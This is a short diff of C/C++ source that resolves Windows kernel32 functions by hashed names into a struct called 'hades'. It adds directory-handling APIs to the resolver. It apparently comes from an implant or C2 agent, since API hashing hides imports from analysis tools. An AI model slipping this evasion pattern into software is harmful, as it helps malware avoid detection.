@@ -82,12 +82,14 @@ BOOL LoadAPIS() {
 
 	hades->Modules.K32 = GetModule(HASHED_Kernel322);;
 	if (hades->Modules.K32) {
-		hades->WinApis.MoveFileA          = (decltype(hades->WinApis.MoveFileA))          GetProc(hades->Modules.K32, HASHED_MoveFileA);
-		hades->WinApis.LoadLibraryA       = (decltype(hades->WinApis.LoadLibraryA))       GetProc(hades->Modules.K32, HASHED_LoadLibraryA);
-		hades->WinApis.GetComputerNameExA = (decltype(hades->WinApis.GetComputerNameExA)) GetProc(hades->Modules.K32, HASHED_GetComputerNameExA);
-		hades->WinApis.GetModuleFileNameA = (decltype(hades->WinApis.GetModuleFileNameA)) GetProc(hades->Modules.K32, HASHED_GetModuleFileNameA);
-		hades->WinApis.GetTickCount       = (decltype(hades->WinApis.GetTickCount))       GetProc(hades->Modules.K32, HASHED_GetTickCount);
-		hades->WinApis.CloseHandle        = (decltype(hades->WinApis.CloseHandle))        GetProc(hades->Modules.K32, HASHED_CloseHandle);
+		hades->WinApis.SetCurrentDirectoryA = (decltype(hades->WinApis.SetCurrentDirectoryA))GetProc(hades->Modules.K32, HASHED_SetCurrentDirectoryA);
+		hades->WinApis.GetCurrentDirectoryA = (decltype(hades->WinApis.GetCurrentDirectoryA)) GetProc(hades->Modules.K32, HASHED_GetCurrentDirectoryA);
+		hades->WinApis.MoveFileA            = (decltype(hades->WinApis.MoveFileA))            GetProc(hades->Modules.K32, HASHED_MoveFileA);
+		hades->WinApis.LoadLibraryA         = (decltype(hades->WinApis.LoadLibraryA))         GetProc(hades->Modules.K32, HASHED_LoadLibraryA);
+		hades->WinApis.GetComputerNameExA   = (decltype(hades->WinApis.GetComputerNameExA))   GetProc(hades->Modules.K32, HASHED_GetComputerNameExA);
+		hades->WinApis.GetModuleFileNameA   = (decltype(hades->WinApis.GetModuleFileNameA))   GetProc(hades->Modules.K32, HASHED_GetModuleFileNameA);
+		hades->WinApis.GetTickCount         = (decltype(hades->WinApis.GetTickCount))         GetProc(hades->Modules.K32, HASHED_GetTickCount);
+		hades->WinApis.CloseHandle          = (decltype(hades->WinApis.CloseHandle))          GetProc(hades->Modules.K32, HASHED_CloseHandle);
 	}
 
 	hades->Modules.NTDLL = GetModule(HASHED_NTDLL);
